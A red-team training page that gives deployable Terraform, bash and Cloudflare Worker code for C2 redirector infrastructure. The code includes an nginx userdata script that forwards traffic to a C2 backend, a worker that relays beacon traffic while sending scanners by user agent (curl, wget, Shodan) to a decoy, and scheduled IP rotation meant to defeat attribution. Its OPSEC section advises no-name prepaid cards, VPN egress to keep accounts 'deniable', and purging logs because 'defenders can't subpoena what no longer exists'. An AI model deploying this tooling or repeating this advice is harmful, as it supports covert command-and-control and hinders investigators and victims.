---
layout: training-page
title: "Terraform Redirector Stack — IaC for Engagement Infrastructure — Red Team Academy"
module: "Infrastructure"
tags:
  - terraform
  - iac
  - redirectors
  - infrastructure
  - opsec
  - cloudflare
  - aws
page_key: "infrastructure-terraform-redirector-stack"
render_with_liquid: false
---

# Terraform Redirector Stack

Engagement infrastructure managed as code is the difference between a team that loses an hour rebuilding after a burn and one that loses ten minutes. It is also the difference between five operators each cargo-culting their own slightly broken `apache2.conf` and a fleet that looks identical from the defender's side. The opinions in this page are senior-infra opinions: state lives in an encrypted backend, secrets never live in `.tfvars`, and the `terraform destroy` killswitch is rehearsed before the engagement — not improvised at 3AM when a SOC analyst notices your redirector on a dashboard.

## Why IaC for Engagement Infra

1. **Speed of burn.** A sinkholed redirector or flipped domain category needs a fresh node with TLS in under fifteen minutes. `terraform apply -var domain=newcdn-assets.io` gets you there.
2. **Repeatability.** Three operators produce three subtly broken nginx configs — one leaves `server_tokens on`, another forgets to strip `X-Forwarded-For`. IaC makes the build deterministic.
3. **Cost tracking.** Tags (`Engagement`, `Operator`, `Purpose`) on every resource let Cost Explorer answer the invoicing question and flag orphans.
4. **Documentation-as-code.** Six months later, "what was that redirector on April 14?" answers from git log in thirty seconds — not bash history on a destroyed VPS.

## Stack Overview

Minimal VPC + single public subnet (no NAT — $30/AZ/month for nothing). HTTPS redirector EC2 running nginx + certbot, userdata pulling a malleable-profile-aware config from S3. Route53 with low TTL plus a Lambda-driven scheduled IP rotation. S3 access-log bucket with a 14-day lifecycle. Cloudflare Worker as a zero-EC2 alternative tier. Throwaway-domain provisioning via `null_resource`. Killswitch Makefile: one `make killswitch` archives logs then destroys everything.

## AWS Provider Setup

State backend first. Local state on an operator laptop is one stolen MacBook away from a catastrophic leak. Encrypted S3 backend with versioning and DynamoDB locking, in a *separate* AWS account from the one running redirectors.

```hcl
# providers.tf
terraform {
  required_version = ">= 1.7.0"
  required_providers {
    aws        = { source = "hashicorp/aws",        version = "~> 5.40" }
    cloudflare = { source = "cloudflare/cloudflare", version = "~> 4.30" }
    random     = { source = "hashicorp/random",     version = "~> 3.6" }
  }
  backend "s3" {
    bucket         = "rt-tfstate-burner-acct"
    key            = "engagements/acme-2026-q2/redirectors.tfstate"
    region         = "us-east-1"
    encrypt        = true
    kms_key_id     = "alias/tfstate-key"
    dynamodb_table = "tfstate-locks"
  }
}

provider "aws" {
  region = var.aws_region
  assume_role {
    role_arn     = var.burner_role_arn
    session_name = "redirector-stack-${var.engagement_id}"
  }
  default_tags {
    tags = {
      Engagement = var.engagement_id
      Operator   = var.operator
      ManagedBy  = "terraform"
      Purpose    = "engagement-redirector"
    }
  }
}

provider "cloudflare" {
  api_token = var.cloudflare_api_token
}
```

The `assume_role` block matters: the operator's long-lived IAM user has no direct permissions on the burner account — it can only assume a role with a session name that tags every API call. When CloudTrail gets subpoenaed, every action binds to an engagement ID and operator. `var.cloudflare_api_token` and `var.burner_role_arn` come from `TF_VAR_*` env vars or Vault — never a checked-in `.tfvars`.

## VPC Module

The redirector VPC is intentionally minimal. One public subnet, one route table, one internet gateway. No NAT, no private subnets, no VPC endpoints. A redirector that needs more has been over-architected.

```hcl
# vpc.tf
resource "aws_vpc" "redirector" {
  cidr_block           = "10.42.0.0/16"
  enable_dns_support   = true
  enable_dns_hostnames = true
  tags = { Name = "redirector-vpc-${var.engagement_id}" }
}

resource "aws_subnet" "public" {
  vpc_id                  = aws_vpc.redirector.id
  cidr_block              = "10.42.1.0/24"
  availability_zone       = "${var.aws_region}a"
  map_public_ip_on_launch = true
}

resource "aws_internet_gateway" "gw" { vpc_id = aws_vpc.redirector.id }

resource "aws_route_table" "public" {
  vpc_id = aws_vpc.redirector.id
  route {
    cidr_block = "0.0.0.0/0"
    gateway_id = aws_internet_gateway.gw.id
  }
}

resource "aws_route_table_association" "public" {
  subnet_id      = aws_subnet.public.id
  route_table_id = aws_route_table.public.id
}

locals {
  redirector_ingress = [
    { port = 443, cidrs = ["0.0.0.0/0"],            desc = "HTTPS from target" },
    { port = 80,  cidrs = ["0.0.0.0/0"],            desc = "ACME challenge" },
    { port = 22,  cidrs = var.operator_admin_cidrs, desc = "SSH from operator VPN" },
  ]
}

resource "aws_security_group" "redirector" {
  name   = "redirector-sg-${var.engagement_id}"
  vpc_id = aws_vpc.redirector.id
  dynamic "ingress" {
    for_each = local.redirector_ingress
    content {
      description = ingress.value.desc
      from_port   = ingress.value.port
      to_port     = ingress.value.port
      protocol    = "tcp"
      cidr_blocks = ingress.value.cidrs
    }
  }
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
```

`var.operator_admin_cidrs` is a list of `/32` CIDRs for the operator VPN exit IPs. Never `0.0.0.0/0` on port 22. Ever.

## Redirector EC2 Instance

`t3.micro` — a redirector handles tens of requests per minute, not thousands. Cheap, fast to boot, available in every region.

```hcl
# redirector.tf
data "aws_ami" "debian_12" {
  most_recent = true
  owners      = ["136693071363"] # Debian official
  filter {
    name   = "name"
    values = ["debian-12-amd64-*"]
  }
}

resource "random_id" "instance_suffix" { byte_length = 4 }

resource "aws_key_pair" "operator" {
  key_name   = "redirector-operator-${random_id.instance_suffix.hex}"
  public_key = var.operator_ssh_public_key
}

resource "aws_instance" "redirector" {
  ami                    = data.aws_ami.debian_12.id
  instance_type          = "t3.micro"
  subnet_id              = aws_subnet.public.id
  vpc_security_group_ids = [aws_security_group.redirector.id]
  key_name               = aws_key_pair.operator.key_name
  root_block_device {
    volume_type = "gp3"
    volume_size = 16
    encrypted   = true
  }
  metadata_options {
    http_tokens   = "required" # IMDSv2 only
    http_endpoint = "enabled"
  }
  user_data = templatefile("${path.module}/userdata/redirector.sh.tftpl", {
    redirector_fqdn   = var.redirector_fqdn
    c2_backend_ip     = var.c2_backend_ip
    operator_email    = var.operator_email
    log_bucket        = aws_s3_bucket.access_logs.id
    malleable_profile = var.malleable_profile_name
  })
  user_data_replace_on_change = true
  tags = { Name = "redirector-${var.engagement_id}-${random_id.instance_suffix.hex}" }
}

resource "aws_eip" "redirector" {
  instance = aws_instance.redirector.id
  domain   = "vpc"
}
```

`user_data_replace_on_change = true` means modifying userdata forces a new instance — what you want, because mutating a running redirector is the path to drift.

The userdata template:

```bash
#!/bin/bash
# userdata/redirector.sh.tftpl
set -euo pipefail
apt-get update -y
apt-get install -y nginx certbot python3-certbot-nginx awscli unattended-upgrades

# IPv6 off — defenders trace v6 less, less surface
echo "net.ipv6.conf.all.disable_ipv6 = 1" >> /etc/sysctl.conf
sysctl -p

# Pull nginx config matching the malleable profile in use
aws s3 cp "s3://${log_bucket}-configs/profiles/${malleable_profile}.conf" \
    /etc/nginx/sites-available/redirector.conf
ln -sf /etc/nginx/sites-available/redirector.conf /etc/nginx/sites-enabled/redirector.conf
rm -f /etc/nginx/sites-enabled/default
sed -i "s|__C2_BACKEND_IP__|${c2_backend_ip}|g"   /etc/nginx/sites-available/redirector.conf
sed -i "s|__REDIRECTOR_FQDN__|${redirector_fqdn}|g" /etc/nginx/sites-available/redirector.conf

# Acquire TLS cert
systemctl stop nginx
certbot certonly --standalone --non-interactive --agree-tos \
    -m "${operator_email}" -d "${redirector_fqdn}"

# Ship access logs hourly to S3
cat > /etc/logrotate.d/nginx-s3 <<EOF
/var/log/nginx/*.log {
    hourly
    rotate 1
    missingok
    notifempty
    sharedscripts
    postrotate
        /usr/bin/aws s3 cp /var/log/nginx/access.log.1 \
            s3://${log_bucket}/redirector/\$(date +%%Y/%%m/%%d/%%H).log.gz \
            --content-encoding gzip || true
    endscript
}
EOF

# SSH lockdown + start
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/^#*PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
systemctl restart ssh
systemctl enable nginx && systemctl start nginx
```

The `__C2_BACKEND_IP__` and `__REDIRECTOR_FQDN__` sentinels are substituted into a config baked from your malleable profile (`jquery.conf`, `amazon.conf`, whichever fits the engagement). Keep profile configs in a separate S3 bucket so swapping profiles is a config change, not a Terraform change.

## DNS Records with Rotation

Route53 hosted zone delegated from a registrar that supports rapid updates. A record points at the EIP, TTL is deliberately short.

```hcl
# dns.tf

data "aws_route53_zone" "engagement" {
  name         = var.engagement_zone
  private_zone = false
}

resource "aws_route53_record" "redirector_a" {
  zone_id = data.aws_route53_zone.engagement.zone_id
  name    = var.redirector_fqdn
  type    = "A"
  ttl     = 60
  records = [aws_eip.redirector.public_ip]
}
```

TTL of 60 seconds: flip the A record after a burn and every resolver picks up the new value within a minute. For long engagements, rotate the IP on a schedule even when nothing is burned — defenders watching DNS history get noise instead of a clean attribution timeline.

```hcl
# rotation.tf
resource "aws_lambda_function" "rotate_redirector" {
  filename         = "${path.module}/lambda/rotate.zip"
  function_name    = "redirector-rotator-${var.engagement_id}"
  role             = aws_iam_role.rotator.arn
  handler          = "rotate.handler"
  runtime          = "python3.12"
  timeout          = 300
  source_code_hash = filebase64sha256("${path.module}/lambda/rotate.zip")
  environment {
    variables = {
      REDIRECTOR_FQDN = var.redirector_fqdn
      HOSTED_ZONE_ID  = data.aws_route53_zone.engagement.zone_id
      INSTANCE_ID     = aws_instance.redirector.id
    }
  }
}

resource "aws_cloudwatch_event_rule" "rotation_schedule" {
  name                = "redirector-rotation-${var.engagement_id}"
  schedule_expression = "rate(12 hours)"
  state               = var.rotation_enabled ? "ENABLED" : "DISABLED"
}

resource "aws_cloudwatch_event_target" "rotation_target" {
  rule = aws_cloudwatch_event_rule.rotation_schedule.name
  arn  = aws_lambda_function.rotate_redirector.arn
}

resource "aws_lambda_permission" "allow_eventbridge" {
  action        = "lambda:InvokeFunction"
  function_name = aws_lambda_function.rotate_redirector.function_name
  principal     = "events.amazonaws.com"
  source_arn    = aws_cloudwatch_event_rule.rotation_schedule.arn
}
```

The Lambda releases the EIP, allocates a new one, associates it with the instance, and updates the A record in under thirty seconds.

## Cloudflare Worker Alternative

For a redirector with no AWS footprint — no EC2 bill, no CloudTrail, no EIP to trace — Cloudflare Workers are the right answer. Geo-distributed by default, egress IP shared with millions of legitimate sites, no instance to fingerprint.

```hcl
# cloudflare_worker.tf
resource "cloudflare_worker_script" "redirector" {
  account_id = var.cloudflare_account_id
  name       = "redirector-${var.engagement_id}"
  content    = file("${path.module}/workers/redirector.js")
  plain_text_binding {
    name = "C2_BACKEND"
    text = var.c2_backend_url
  }
  secret_text_binding {
    name = "BEACON_AUTH_HEADER"
    text = var.beacon_auth_header_value
  }
}

resource "cloudflare_worker_domain" "redirector" {
  account_id = var.cloudflare_account_id
  hostname   = var.redirector_fqdn
  service    = cloudflare_worker_script.redirector.name
  zone_id    = var.cloudflare_zone_id
}
```

The worker:

```javascript
// workers/redirector.js
const ALLOWED_URI_PATTERNS = [/^\/jquery-3\.3\.1\.min\.js/, /^\/api\/v2\//, /^\/cdn-cgi\/__/];
const SCANNER_UA_PATTERNS  = [/curl/i, /wget/i, /python-requests/i, /Shodan/i, /masscan/i, /zgrab/i, /Go-http-client/i];
const DECOY_URL = "https://www.microsoft.com";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const ua  = request.headers.get("user-agent") || "";
    const beaconHeader = request.headers.get("x-beacon-auth");

    if (SCANNER_UA_PATTERNS.some((re) => re.test(ua))) {
      return Response.redirect(DECOY_URL, 302);
    }
    const uriOk  = ALLOWED_URI_PATTERNS.some((re) => re.test(url.pathname));
    const authOk = beaconHeader === env.BEACON_AUTH_HEADER;
    if (!uriOk || !authOk) {
      return Response.redirect(DECOY_URL, 302);
    }

    const upstream = new URL(env.C2_BACKEND);
    upstream.pathname = url.pathname;
    upstream.search   = url.search;
    return fetch(new Request(upstream.toString(), {
      method: request.method,
      headers: {
        "user-agent":   ua,
        "content-type": request.headers.get("content-type") || "application/octet-stream",
      },
      body: ["GET", "HEAD"].includes(request.method) ? null : request.body,
    }));
  },
};
```

Tradeoff: Cloudflare logs every request and will hand them over on a valid legal order. For engagements where Cloudflare-data-sharing posture is favorable, fine. For sensitive work, prefer the EC2 path where you control log retention end-to-end.

## Throwaway Domain Provisioning

Domain purchase doesn't fit cleanly in Terraform — registrars have wildly different APIs and most lack a real provider. Use a `null_resource` calling a script.

```hcl
# domains.tf
resource "null_resource" "register_domain" {
  count    = var.purchase_new_domain ? 1 : 0
  triggers = { domain = var.redirector_fqdn }
  provisioner "local-exec" {
    command = <<-EOT
      python3 ${path.module}/scripts/buy_domain.py \
        --registrar namecheap \
        --domain ${var.redirector_fqdn} \
        --years 1 \
        --nameservers ns-1.awsdns-01.com,ns-2.awsdns-02.net
    EOT
    environment = {
      NAMECHEAP_API_USER = var.namecheap_api_user
      NAMECHEAP_API_KEY  = var.namecheap_api_key
    }
  }
  provisioner "local-exec" {
    when    = destroy
    command = "echo 'Domain ${self.triggers.domain} NOT released — park it for next engagement'"
  }
}
```

The destroy-time provisioner deliberately does *not* release the domain — burned-but-paid-up domains park nicely and can be repurposed after a 30–60 day cool-down. For high-end engagements, prefer aged domains from `expireddomains.net` or `domcop` (`--source expired-marketplace --age-min 730` filters ≥2 years of history).

## Logs and Cleanup

Versioned, encrypted S3 bucket with a hard 14-day lifecycle. Defenders can't subpoena what no longer exists.

```hcl
# logs.tf
resource "aws_s3_bucket" "access_logs" {
  bucket        = "rt-logs-${var.engagement_id}-${random_id.instance_suffix.hex}"
  force_destroy = true
}

resource "aws_s3_bucket_server_side_encryption_configuration" "access_logs" {
  bucket = aws_s3_bucket.access_logs.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm     = "aws:kms"
      kms_master_key_id = var.logs_kms_key_id
    }
    bucket_key_enabled = true
  }
}

resource "aws_s3_bucket_versioning" "access_logs" {
  bucket = aws_s3_bucket.access_logs.id
  versioning_configuration { status = "Enabled" }
}

resource "aws_s3_bucket_public_access_block" "access_logs" {
  bucket                  = aws_s3_bucket.access_logs.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_lifecycle_configuration" "access_logs" {
  bucket = aws_s3_bucket.access_logs.id
  rule {
    id     = "auto-purge"
    status = "Enabled"
    expiration                    { days           = 14 }
    noncurrent_version_expiration { noncurrent_days = 7 }
  }
}

resource "aws_cloudwatch_log_group" "redirector" {
  name              = "/redirector/${var.engagement_id}"
  retention_in_days = 14
  kms_key_id        = var.logs_kms_key_arn
}
```

`force_destroy = true` is deliberate: when the killswitch fires, the bucket goes whether or not it still holds objects. The standard advice is the opposite — but engagement infrastructure inverts production: retaining data past the engagement is a *liability*, not an asset.

## Killswitch

A Makefile that wraps `terraform destroy` with final log export, a confirmation prompt, and a slack notification. Rehearsed before the engagement, not improvised during one.

```makefile
# Makefile
ENGAGEMENT  ?= acme-2026-q2
ARCHIVE_DIR ?= /secure/engagement-archives/$(ENGAGEMENT)
TF_VARS     ?= -var-file=engagements/$(ENGAGEMENT).tfvars
.PHONY: plan apply destroy archive killswitch

plan:    ; terraform plan $(TF_VARS)
apply:   ; terraform apply $(TF_VARS)

archive:
	mkdir -p $(ARCHIVE_DIR)
	aws s3 sync s3://$$(terraform output -raw log_bucket) $(ARCHIVE_DIR)/logs/
	terraform show -json > $(ARCHIVE_DIR)/state.json
	gpg --encrypt --recipient ops@team.example $(ARCHIVE_DIR)/state.json
	tar czf $(ARCHIVE_DIR).tar.gz $(ARCHIVE_DIR)
	@echo "Archive sealed at $(ARCHIVE_DIR).tar.gz"

killswitch: archive
	@echo "About to DESTROY all infrastructure for engagement: $(ENGAGEMENT)"
	@echo "Type the engagement ID to confirm:"
	@read confirm && [ "$$confirm" = "$(ENGAGEMENT)" ] || (echo "Mismatch — aborting"; exit 1)
	terraform destroy $(TF_VARS) -auto-approve
	@echo "Killswitch complete. Verify in AWS console that no resources remain."
```

The pre-arranged phrase for "we got caught" is `make killswitch ENGAGEMENT=acme-2026-q2`. Every operator knows it. Mean time from burn detection to infrastructure gone: under three minutes.

## OPSEC Considerations

Five rules that matter more than the Terraform itself:

1. **Burner AWS account, period.** Never share an org with your corporate or customer tooling. AWS aggregates billing, support cases, and abuse reports across the org — one cross-contamination links your real identity to the redirector.
2. **Payment method.** Burner virtual prepaid card with no name (Privacy.com, Revolut Disposable). Never a personal credit card.
3. **Source IP for `terraform apply`.** Run apply from a dedicated ops VM egressing through a commercial VPN. CloudTrail logs source IP — if your home IP appears, the burner is no longer deniable.
4. **Workspace separation.** One Terraform workspace per engagement. Bucket names, role ARNs, log groups all carry the engagement ID.
5. **Do not apply from your engagement IP.** Your operator laptop has an active VPN into the target. It must not also be the box running `terraform destroy`.

## Variations — Azure and GCP

Same pattern, different names.

**Azure.** Swap `aws_instance` → `azurerm_linux_virtual_machine`, `aws_eip` → `azurerm_public_ip`, `aws_route53_record` → `azurerm_dns_a_record`. Worker analogue: **Azure Front Door** with a custom rules engine. Log storage: **Azure Blob** with lifecycle policy. Bonus: **Azure Functions Premium** with custom domain gives a worker-style redirector with VNet integration when C2 is also in Azure.

**GCP.** Swap to `google_compute_instance`, `google_compute_address`, `google_dns_record_set`. Serverless option: **Cloud Run** with custom domain mapping — containerised nginx, autoscaling, free TLS. Best billing granularity of the three for short engagements (4-hour social-engineering test costs cents).

## Resources

- Outflank "Mature Infrastructure" — `outflank.nl/blog/2017/09/24/mature-infrastructure/`
- Cobalt Strike infrastructure docs — `hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/`
- Malleable C2 + Terraform integration patterns — `github.com/threatexpress/malleable-c2`
- HashiCorp AWS provider docs — `registry.terraform.io/providers/hashicorp/aws/latest/docs`
- HashiCorp Cloudflare provider docs — `registry.terraform.io/providers/cloudflare/cloudflare/latest/docs`
- Bluescreenofjeff Red Team Infrastructure Wiki — `github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki`
- DeadCanary (reference IaC for red team) — `github.com/rmikehodges/DeadCanary`
- Byt3bl33d3r infrastructure automation — `byt3bl33d3r.github.io/red-team-infrastructure-automation.html`
- Related on this site: [Redirector Architecture & Setup](/infrastructure/redirector-setup/), [Engagement Infrastructure](/c2-frameworks/engagement-infrastructure/), [Domain Categorization](/infrastructure/domain-categorization/)
